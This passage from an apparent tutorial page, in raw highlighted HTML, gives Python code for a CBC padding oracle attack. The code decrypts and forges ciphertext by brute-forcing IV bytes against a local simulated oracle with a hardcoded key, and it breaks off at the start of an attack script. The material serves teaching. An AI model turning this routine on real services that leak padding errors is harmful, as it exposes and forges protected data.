blowfish/AES/DES/DES3/CAST/ARC2 </span><br><br>  cipher = <span class="hljs-string">&quot;blowfish&quot;</span><br><br>  <span class="hljs-comment">########################################</span><br><br> <br><br>  block_size = <span class="hljs-number">8</span><br><br>  <span class="hljs-keyword">if</span> cipher.lower() == <span class="hljs-string">&quot;aes&quot;</span>:<br><br>    block_size = <span class="hljs-number">16</span><br><br> <br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(iv) != block_size:<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] IV must be &quot;</span>+<span class="hljs-built_in">str</span>(block_size)+<span class="hljs-string">&quot; bytes long(the same as block_size)!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Generate Target Ciphertext ===&quot;</span><br><br> <br><br>  ciphertext = encrypt(plain, iv, cipher)<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ciphertext:<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Encrypt Error!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] plaintext is: &quot;</span>+plain<br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] iv is: &quot;</span>+hex_s(iv)<br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] ciphertext is: &quot;</span>+ hex_s(ciphertext)<br><br>  <span class="hljs-built_in">print</span><br><br> <br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Start Padding Oracle Decrypt ===&quot;</span><br><br>  <span class="hljs-built_in">print</span><br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Choosing Cipher: &quot;</span>+cipher.upper()<br><br> <br><br>  guess = padding_oracle_decrypt(cipher, ciphertext, iv, block_size)<br><br> <br><br>  <span class="hljs-keyword">if</span> guess:<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Guess intermediary value is: &quot;</span>+hex_s(guess[<span class="hljs-string">&quot;intermediary&quot;</span>])<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] plaintext = intermediary_value XOR original_IV&quot;</span><br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Guess plaintext is: &quot;</span>+guess[<span class="hljs-string">&quot;plaintext&quot;</span>]<br><br>    <span class="hljs-built_in">print</span><br><br> <br><br>    <span class="hljs-keyword">if</span> plain_want:<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Start Padding Oracle Encrypt ===&quot;</span><br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] plaintext want to encrypt is: &quot;</span>+plain_want<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Choosing Cipher: &quot;</span>+cipher.upper()<br><br> <br><br>      en = padding_oracle_encrypt(cipher, ciphertext, plain_want, iv, block_size)<br><br> <br><br>      <span class="hljs-keyword">if</span> en:<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Encrypt Success!&quot;</span><br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] The ciphertext you want is: &quot;</span>+hex_s(en[block_size:])<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] IV is: &quot;</span>+hex_s(en[:block_size])<br><br>        <span class="hljs-built_in">print</span><br><br>       <br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Let&#x27;s verify the custom encrypt result ===&quot;</span><br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Decrypt of ciphertext &#x27;&quot;</span>+ hex_s(en[block_size:]) +<span class="hljs-string">&quot;&#x27; is:&quot;</span><br><br>        de = decrypt(en[block_size:], en[:block_size], cipher)<br><br>        <span class="hljs-keyword">if</span> de == add_PKCS5_padding(plain_want, block_size):<br><br>          <span class="hljs-built_in">print</span> de<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Bingo!&quot;</span><br><br>        <span class="hljs-keyword">else</span>:<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] It seems something wrong happened!&quot;</span><br><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding_oracle_encrypt</span>(<span class="hljs-params">cipher, ciphertext, plaintext, iv, block_size=<span class="hljs-number">8</span></span>):<br><br>  <span class="hljs-comment"># the last block</span><br><br>  guess_cipher = ciphertext[<span class="hljs-number">0</span>-block_size:] <br><br> <br><br>  plaintext = add_PKCS5_padding(plaintext, block_size)<br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] After padding, plaintext becomes to: &quot;</span>+hex_s(plaintext)<br><br>  <span class="hljs-built_in">print</span><br><br> <br><br>  block = <span class="hljs-built_in">len</span>(plaintext)<br><br>  iv_nouse = iv <span class="hljs-comment"># no use here, in fact we only need intermediary</span><br><br>  prev_cipher = ciphertext[<span class="hljs-number">0</span>-block_size:] <span class="hljs-comment"># init with the last cipher block</span><br><br>  <span class="hljs-keyword">while</span> block &gt; <span class="hljs-number">0</span>:<br><br>    <span class="hljs-comment"># we need the intermediary value</span><br><br>    tmp = padding_oracle_decrypt_block(cipher, prev_cipher, iv_nouse, block_size, debug=<span class="hljs-literal">False</span>)<br><br> <br><br>    <span class="hljs-comment"># calculate the iv, the iv is the ciphertext of the previous block</span><br><br>    prev_cipher = xor_str( plaintext[block-block_size:block], tmp[<span class="hljs-string">&quot;intermediary&quot;</span>] )<br><br> <br><br>    <span class="hljs-comment">#save result</span><br><br>    guess_cipher = prev_cipher + guess_cipher<br><br> <br><br>    block = block - block_size<br><br> <br><br>  <span class="hljs-keyword">return</span> guess_cipher  <br><br> <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding_oracle_decrypt</span>(<span class="hljs-params">cipher, ciphertext, iv, block_size=<span class="hljs-number">8</span>, debug=<span class="hljs-literal">True</span></span>):<br><br>  <span class="hljs-comment"># split cipher into blocks; we will manipulate ciphertext block by block</span><br><br>  cipher_block = split_cipher_block(ciphertext, block_size)<br><br> <br><br>  <span class="hljs-keyword">if</span> cipher_block:<br><br>    result = &#123;&#125;<br><br>    result[<span class="hljs-string">&quot;intermediary&quot;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br><br>    result[<span class="hljs-string">&quot;plaintext&quot;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br><br> <br><br>    counter = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cipher_block:<br><br>      <span class="hljs-keyword">if</span> debug:<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Now try to decrypt block &quot;</span>+<span class="hljs-built_in">str</span>(counter)<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Block &quot;</span>+<span class="hljs-built_in">str</span>(counter)+<span class="hljs-string">&quot;&#x27;s ciphertext is: &quot;</span>+hex_s(c)<br><br>        <span class="hljs-built_in">print</span><br><br>      <span class="hljs-comment"># padding oracle to each block</span><br><br>      guess = padding_oracle_decrypt_block(cipher, c, iv, block_size, debug)<br><br> <br><br>      <span class="hljs-keyword">if</span> guess:<br><br>        iv = c<br><br>        result[<span class="hljs-string">&quot;intermediary&quot;</span>] += guess[<span class="hljs-string">&quot;intermediary&quot;</span>]<br><br>        result[<span class="hljs-string">&quot;plaintext&quot;</span>] += guess[<span class="hljs-string">&quot;plaintext&quot;</span>]<br><br>        <span class="hljs-keyword">if</span> debug:<br><br>          <span class="hljs-built_in">print</span><br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Block &quot;</span>+<span class="hljs-built_in">str</span>(counter)+<span class="hljs-string">&quot; decrypt!&quot;</span><br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] intermediary value is: &quot;</span>+hex_s(guess[<span class="hljs-string">&quot;intermediary&quot;</span>])<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] The plaintext of block &quot;</span>+<span class="hljs-built_in">str</span>(counter)+<span class="hljs-string">&quot; is: &quot;</span>+guess[<span class="hljs-string">&quot;plaintext&quot;</span>]<br><br>          <span class="hljs-built_in">print</span><br><br>        counter = counter+<span class="hljs-number">1</span><br><br>      <span class="hljs-keyword">else</span>:<br><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] padding oracle decrypt error!&quot;</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>    <span class="hljs-keyword">return</span> result<br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] ciphertext&#x27;s block_size is incorrect!&quot;</span>    <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding_oracle_decrypt_block</span>(<span class="hljs-params">cipher, ciphertext, iv, block_size=<span class="hljs-number">8</span>, debug=<span class="hljs-literal">True</span></span>):<br><br>  result = &#123;&#125;<br><br>  plain = <span class="hljs-string">&#x27;&#x27;</span><br><br>  intermediary = []  <span class="hljs-comment"># list to save intermediary</span><br><br>  iv_p = [] <span class="hljs-comment"># list to save the iv we found</span><br><br> <br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, block_size+<span class="hljs-number">1</span>):<br><br>    iv_try = []<br><br>    iv_p = change_iv(iv_p, intermediary, i)<br><br> <br><br>    <span class="hljs-comment"># construct iv</span><br><br>    <span class="hljs-comment"># iv = \x00...(several 0 bytes) + \x0e(the bruteforce byte) + \xdc...(the iv bytes we found)</span><br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, block_size-i):<br><br>      iv_try.append(<span class="hljs-string">&quot;\x00&quot;</span>)<br><br> <br><br>    <span class="hljs-comment"># bruteforce iv byte for padding oracle</span><br><br>    <span class="hljs-comment"># 1 bytes to bruteforce, then append the rest bytes</span><br><br>    iv_try.append(<span class="hljs-string">&quot;\x00&quot;</span>)<br><br> <br><br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br><br>      iv_tmp = iv_try<br><br>      iv_tmp[<span class="hljs-built_in">len</span>(iv_tmp)-<span class="hljs-number">1</span>] = <span class="hljs-built_in">chr</span>(b)<br><br>    <br><br>      iv_tmp_s = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&quot;%s&quot;</span> % ch <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> iv_tmp)<br><br> <br><br>      <span class="hljs-comment"># append the result of iv, we&#x27;ve just calculate it, saved in iv_p</span><br><br>      <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(iv_p)):<br><br>        iv_tmp_s += iv_p[<span class="hljs-built_in">len</span>(iv_p)-<span class="hljs-number">1</span>-p]<br><br>      <br><br>      <span class="hljs-comment"># in real attack, you have to replace this part to trigger the decrypt program</span><br><br>      <span class="hljs-comment">#print hex_s(iv_tmp_s) # for debug</span><br><br>      plain = decrypt(ciphertext, iv_tmp_s, cipher)<br><br>      <span class="hljs-comment">#print hex_s(plain) # for debug</span><br><br> <br><br>      <span class="hljs-comment"># got it!</span><br><br>      <span class="hljs-comment"># in real attack, you have to replace this part to the padding error judgement</span><br><br>      <span class="hljs-keyword">if</span> check_PKCS5_padding(plain, i):<br><br>        <span class="hljs-keyword">if</span> debug:<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Try IV: &quot;</span>+hex_s(iv_tmp_s)<br><br>          <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Found padding oracle: &quot;</span> + hex_s(plain)<br><br>        iv_p.append(<span class="hljs-built_in">chr</span>(b))<br><br>        intermediary.append(<span class="hljs-built_in">chr</span>(b ^ i))<br><br>        <br><br>        <span class="hljs-keyword">break</span><br><br> <br><br>  plain = <span class="hljs-string">&#x27;&#x27;</span><br><br>  <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(intermediary)):<br><br>    plain += <span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(intermediary[<span class="hljs-built_in">len</span>(intermediary)-<span class="hljs-number">1</span>-ch]) ^ <span class="hljs-built_in">ord</span>(iv[ch]) )<br><br>    <br><br>  result[<span class="hljs-string">&quot;plaintext&quot;</span>] = plain<br><br>  result[<span class="hljs-string">&quot;intermediary&quot;</span>] = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&quot;%s&quot;</span> % ch <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> intermediary)[::-<span class="hljs-number">1</span>]<br><br>  <span class="hljs-keyword">return</span> result<br><br> <br><br><span class="hljs-comment"># save the iv bytes found by padding oracle into a list</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change_iv</span>(<span class="hljs-params">iv_p, intermediary, p</span>):<br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(iv_p)):<br><br>    iv_p[i] = <span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(intermediary[i]) ^ p)<br><br>  <span class="hljs-keyword">return</span> iv_p  <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">split_cipher_block</span>(<span class="hljs-params">ciphertext, block_size=<span class="hljs-number">8</span></span>):<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ciphertext) % block_size != <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  result = []<br><br>  length = <span class="hljs-number">0</span><br><br>  <span class="hljs-keyword">while</span> length &lt; <span class="hljs-built_in">len</span>(ciphertext):<br><br>    result.append(ciphertext[length:length+block_size])<br><br>    length += block_size<br><br> <br><br>  <span class="hljs-keyword">return</span> result<br><br> <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_PKCS5_padding</span>(<span class="hljs-params">plain, p</span>):<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(plain) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-comment"># convert the string</span><br><br>  plain = plain[::-<span class="hljs-number">1</span>]<br><br>  ch = <span class="hljs-number">0</span><br><br>  found = <span class="hljs-number">0</span><br><br>  <span class="hljs-keyword">while</span> ch &lt; p:<br><br>    <span class="hljs-keyword">if</span> plain[ch] == <span class="hljs-built_in">chr</span>(p):<br><br>      found += <span class="hljs-number">1</span><br><br>    ch += <span class="hljs-number">1</span> <br><br> <br><br>  <span class="hljs-keyword">if</span> found == p:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_PKCS5_padding</span>(<span class="hljs-params">plaintext, block_size</span>):<br><br>  s = <span class="hljs-string">&#x27;&#x27;</span><br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(plaintext) % block_size == <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> plaintext<br><br> <br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(plaintext) &lt; block_size:<br><br>    padding = block_size - <span class="hljs-built_in">len</span>(plaintext)<br><br>  <span class="hljs-keyword">else</span>:<br><br>    padding = block_size - (<span class="hljs-built_in">len</span>(plaintext) % block_size)<br><br>  <br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, padding):<br><br>    plaintext += <span class="hljs-built_in">chr</span>(padding)<br><br> <br><br>  <span class="hljs-keyword">return</span> plaintext<br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, iv, cipher</span>):<br><br>  <span class="hljs-comment"># we only need the padding error itself, not the key</span><br><br>  <span class="hljs-comment"># you may gain padding error info in other ways</span><br><br>  <span class="hljs-comment"># in real attack, you may trigger decrypt program</span><br><br>  <span class="hljs-comment"># a complete blackbox environment</span><br><br>  key = ENCKEY<br><br> <br><br>  <span class="hljs-keyword">if</span> cipher.lower() == <span class="hljs-string">&quot;des&quot;</span>:<br><br>    o = DES.new(key, DES.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;aes&quot;</span>:<br><br>    o = AES.new(key, AES.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;des3&quot;</span>:<br><br>    o = DES3.new(key, DES3.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;blowfish&quot;</span>:<br><br>    o = Blowfish.new(key, Blowfish.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;cast&quot;</span>:<br><br>    o = CAST.new(key, CAST.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;arc2&quot;</span>:<br><br>    o = ARC2.new(key, ARC2.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(iv) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ciphertext) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  <span class="hljs-keyword">return</span> o.decrypt(ciphertext)<br><br> <br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plaintext, iv, cipher</span>):<br><br>  key = ENCKEY<br><br> <br><br>  <span class="hljs-keyword">if</span> cipher.lower() == <span class="hljs-string">&quot;des&quot;</span>:<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">8</span>:<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] DES key must be 8 bytes long!&quot;</span><br><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    o = DES.new(key, DES.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;aes&quot;</span>:<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">16</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">24</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">32</span>:<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] AES key must be 16/24/32 bytes long!&quot;</span><br><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    o = AES.new(key, AES.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;des3&quot;</span>:<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">16</span>:<br><br>      <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Triple DES key must be 16 bytes long!&quot;</span><br><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    o = DES3.new(key, DES3.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;blowfish&quot;</span>:<br><br>    o = Blowfish.new(key, Blowfish.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;cast&quot;</span>:<br><br>    o = CAST.new(key, CAST.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">elif</span> cipher.lower() == <span class="hljs-string">&quot;arc2&quot;</span>:<br><br>    o = ARC2.new(key, ARC2.MODE_CBC,iv)<br><br>  <span class="hljs-keyword">else</span>:<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  plaintext = add_PKCS5_padding(plaintext, <span class="hljs-built_in">len</span>(iv))  <br><br> <br><br>  <span class="hljs-keyword">return</span> o.encrypt(plaintext)<br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_str</span>(<span class="hljs-params">a,b</span>):<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) != <span class="hljs-built_in">len</span>(b):<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br> <br><br>  c = <span class="hljs-string">&#x27;&#x27;</span><br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(a)):<br><br>    c += <span class="hljs-built_in">chr</span>( <span class="hljs-built_in">ord</span>(a[i]) ^ <span class="hljs-built_in">ord</span>(b[i]) )<br><br> <br><br>  <span class="hljs-keyword">return</span> c<br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_s</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br><br>  re = <span class="hljs-string">&#x27;&#x27;</span><br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br><br>    re += <span class="hljs-string">&quot;\\x&quot;</span>+binascii.b2a_hex(<span class="hljs-built_in">str</span>[i])<br><br>  <span class="hljs-keyword">return</span> re<br><br> <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>        main(sys.argv)<br></code></pre></td></tr></table></figure><h5 id="（3）python3"><a href="#（3）python3" class="headerlink" title="（3）python3"></a><strong>（3）python3</strong></h5><p>poa.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> hexdump <span class="hljs-keyword">import</span> hexdump<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">import</span> IPython<br><br><br>plain = <span class="hljs-string">b&quot;Hello World! MTDP! RedTeam! 23333&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">POA</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    KEY = <span class="hljs-string">b&quot;1234567890abcdef&quot;</span><br>    IV = <span class="hljs-string">b&quot;0102030405060708&quot;</span><br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__pad</span>(<span class="hljs-params">cls, text: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;PKCS7 padding&quot;&quot;&quot;</span><br>        text_length = <span class="hljs-built_in">len</span>(text)<br>        amount_to_pad = AES.block_size - (text_length % AES.block_size)<br>        <span class="hljs-keyword">if</span> amount_to_pad == <span class="hljs-number">0</span>:<br>            amount_to_pad = AES.block_size<br>        pad = <span class="hljs-built_in">chr</span>(amount_to_pad).encode()<br>        <span class="hljs-keyword">return</span> text + pad * amount_to_pad<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__unpad</span>(<span class="hljs-params">cls, text: <span class="hljs-built_in">bytes</span></span>):<br>        pad = text[-<span class="hljs-number">1</span>]<br>        _pad = text[-pad:]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> _pad:<br>            <span class="hljs-keyword">if</span> pad != i:<br>                <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Error Padding! - %s&quot;</span> % _pad)<br>        <span class="hljs-keyword">return</span> text[:-pad]<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">cls, plain: <span class="hljs-built_in">bytes</span></span>):<br>        pad_plain = cls.__pad(plain)<br>        aes = AES.new(mode=AES.MODE_CBC, key=cls.KEY, iv=cls.IV)<br>        cipher = aes.encrypt(pad_plain)<br>        hexdump(cipher)<br>        <span class="hljs-keyword">return</span> cipher<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cls, cipher: <span class="hljs-built_in">bytes</span></span>):<br>        aes = AES.new(mode=AES.MODE_CBC, key=cls.KEY, iv=cls.IV)<br>        pad_plain = aes.decrypt(cipher)<br>        <span class="hljs-keyword">return</span> cls.__unpad(pad_plain)<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_without_result</span>(<span class="hljs-params">cls, cipher: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            cls.decrypt(cipher)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-comment"># print(e)</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-keyword">return</span> POA.encrypt(plain)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cipher = test()<br>    plain = POA.decrypt(cipher)<br>    <span class="hljs-built_in">print</span>(plain)<br><br>    IPython.embed()<br></code></pre></td></tr></table></figure><p>poa_attack.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 